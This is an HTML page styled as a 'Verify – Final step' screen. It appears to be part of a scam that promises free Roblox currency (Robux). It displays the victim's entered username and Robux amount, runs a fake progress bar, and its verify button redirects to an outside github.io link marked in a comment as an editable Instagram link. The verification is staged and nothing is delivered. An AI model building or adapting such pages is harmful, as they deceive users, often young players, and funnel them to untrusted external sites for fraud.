<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>Verify</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
<style>
  :root{
    /* Cosmic background */
    --space1:#0a0414;
    --space2:#120a26;
    --space3:#1d0b3a;
    --star:#fff;

    /* Card */
    --card:#1a1030;
    --card2:#120a26;
    --stroke:#2d2144;

    --text:#f5f3ff;
    --muted:#b9b1d6;

    --btn1:#7e22ce;   /* violet */
    --btn2:#06b6d4;   /* cyan */
    --radius:20px;
  }
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0; font-family:Inter,sans-serif; color:var(--text);
    background:radial-gradient(circle at 20% 30%, var(--space3) 0%, transparent 70%),
               radial-gradient(circle at 80% 20%, #6d28d91a, transparent 60%),
               linear-gradient(180deg,var(--space1),var(--space2));
    overflow-x:hidden;
  }

  /* stars */
  .stars,.stars2{
    position:fixed; inset:0; pointer-events:none;
    background:
      radial-gradient(2px 2px at 20% 30%, var(--star), transparent 40%),
      radial-gradient(1.5px 1.5px at 80% 20%, var(--star), transparent 40%),
      radial-gradient(1.8px 1.8px at 60% 70%, var(--star), transparent 40%),
      radial-gradient(1.2px 1.2px at 35% 85%, var(--star), transparent 40%),
      radial-gradient(1.6px 1.6px at 15% 60%, var(--star), transparent 40%);
    opacity:.3; animation:twinkle 7s linear infinite;
  }
  .stars2{filter:blur(1px); opacity:.2; animation-duration:10s;}
  @keyframes twinkle{0%,100%{opacity:.25}50%{opacity:.45}}

  .wrap{min-height:100dvh; display:grid; place-items:center; padding:28px 16px}
  .card{
    width:min(760px,96vw);
    background:linear-gradient(180deg,var(--card),var(--card2));
    border:1px solid var(--stroke); border-radius:var(--radius);
    box-shadow:0 16px 32px rgba(0,0,0,.45),0 8px 20px rgba(126,34,206,.3);
    padding:24px 18px 26px; text-align:center;
  }
  h1{margin:6px 0 8px; font-size:clamp(1.4rem,1.1rem + 1.2vw,2rem)}
  .muted{color:var(--muted)}

  .pillbox{margin:14px auto 12px; display:flex; gap:10px; justify-content:center; flex-wrap:wrap}
  .pill{background:#23193d; border:1px solid #392e5a; border-radius:999px; padding:8px 12px; font-weight:800}

  .bar-wrap{margin:18px 0 12px; text-align:left}
  .bar-outer{position:relative; height:14px; background:#1c1630; border:1px solid #32274f; border-radius:10px; overflow:hidden}
  .fill{position:absolute; inset:0; width:0%; background:linear-gradient(90deg,var(--btn1),var(--btn2)); transition:width .2s linear}
  .time{text-align:right; color:#c7bdf7; font-size:.92rem; margin-top:6px}

  .btn{
    border:none; color:#fff; font-weight:900; letter-spacing:.02em;
    background:linear-gradient(90deg,var(--btn1),var(--btn2));
    padding:15px 24px; border-radius:16px; cursor:pointer; font-size:17px; width:100%;
    box-shadow:0 16px 40px rgba(147,51,234,.4), inset 0 -2px 0 rgba(0,0,0,.26);
    transition: transform .15s ease, opacity .2s ease;
  }
  .btn[disabled]{opacity:.45; cursor:not-allowed}
  .btn:hover:not([disabled]){transform:translateY(-2px)}

  .footer{
    margin-top:18px; padding:14px; text-align:center; color:#c4b5fd; font-size:.85rem;
    background:#120a26; border-top:1px solid #261c3a; border-radius:0 0 var(--radius) var(--radius);
  }
</style>
</head>
<body>
<div class="stars"></div><div class="stars2"></div>
<main class="wrap">
  <section class="card" role="region" aria-label="Verification">
    <div class="muted">Verify</div>
    <h1>Final step</h1>
    <p class="muted">We’re loading your details. Hang tight for a few seconds.</p>

    <div class="pillbox">
      <div class="pill" id="uPill">User: —</div>
      <div class="pill" id="dPill">Device: —</div>
      <div class="pill" id="rPill">Robux: —</div>
    </div>

    <div class="bar-wrap">
      <div class="bar-outer"><div class="fill" id="fill"></div></div>
      <div class="time"><span id="sec">6</span>s</div>
    </div>

    <button id="verifyBtn" class="btn" disabled>Tap to Verify</button>
    <div class="footer">.</div>
  </section>
</main>

<script>
  function readData(){
    let data=null;
    try{const raw=localStorage.getItem('rbx_entry');if(raw)data=JSON.parse(raw);}catch(e){}
    if(!data){
      const sp=new URLSearchParams(location.search);
      const u=sp.get('u');const r=Number(sp.get('r')||0);
      if(u && r){data={u,r};}
    }
    return data;
  }
  const data=readData();
  const uPill=document.getElementById('uPill');
  const dPill=document.getElementById('dPill');
  const rPill=document.getElementById('rPill');
  const fill=document.getElementById('fill');
  const secEl=document.getElementById('sec');
  const btn=document.getElementById('verifyBtn');

  if(!data||!data.u||!data.r){window.location.replace('index.html');}
  else{
    uPill.textContent=`User: ${data.u}`;
    dPill.textContent=`Device: ${data.d||"—"}`;
    rPill.textContent=`Robux: ${Number(data.r).toLocaleString()}`;
    runProgress();
  }

  function runProgress(){
    const totalMs=6000, started=performance.now();
    const tick=(now)=>{
      const elapsed=now-started, pct=Math.min(1,elapsed/totalMs);
      fill.style.width=(pct*100).toFixed(2)+'%';
      const remain=Math.max(0,Math.ceil((totalMs-elapsed)/1000)); secEl.textContent=remain;
      if(pct<1){requestAnimationFrame(tick);}else{btn.disabled=false;}
    };
    requestAnimationFrame(tick);
  }

  /* EDIT Instagram link here */
  const INSTAGRAM_URL="https://gnesvas.github.io/chjan/";
  btn.addEventListener('click',()=>{window.location.href=INSTAGRAM_URL;});
</script>
</body>
</html>
